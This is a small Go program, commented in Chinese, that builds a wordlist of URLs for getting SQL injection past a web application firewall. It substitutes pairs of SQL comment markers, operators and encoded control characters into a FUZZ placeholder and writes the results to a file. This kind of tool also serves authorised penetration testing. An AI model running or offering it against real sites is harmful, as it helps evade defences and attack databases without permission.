package main

import (
	"fmt"
	"os"
	"strings"
)

func main() {
	url := os.Args[1]
	// 问题1：SQL 注入字典生成器
	var (
		fuzz_zs = []string{"/*", "*/", "/*!", "*", "=", "`", "!", "@", "%", ".", "-", "+", "|", "%00"}
		fuzz_sz = []string{"", " "}
		fuzz_ch = []string{"%0a", "%0b", "%0c", "%0d", "%0e", "%0f", "%0g", "%0h", "%0i", "%0j", "%0k", "%0m", "%0n"}
		fuzz    = append(append(fuzz_ch, fuzz_sz...), fuzz_zs...)
	)

	file, err := os.OpenFile("SQLWaF_Baypass_Dict.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// 可根据实际情况修改循环次数
	for _, a := range fuzz {
		for _, b := range fuzz {
			st := a + b
			newURL := strings.Replace(url, "FUZZ", st, -1)
			fmt.Println(newURL)
			if _, err := file.WriteString(newURL + "\n"); err != nil {
				panic(err)
			}
		}
	}

}
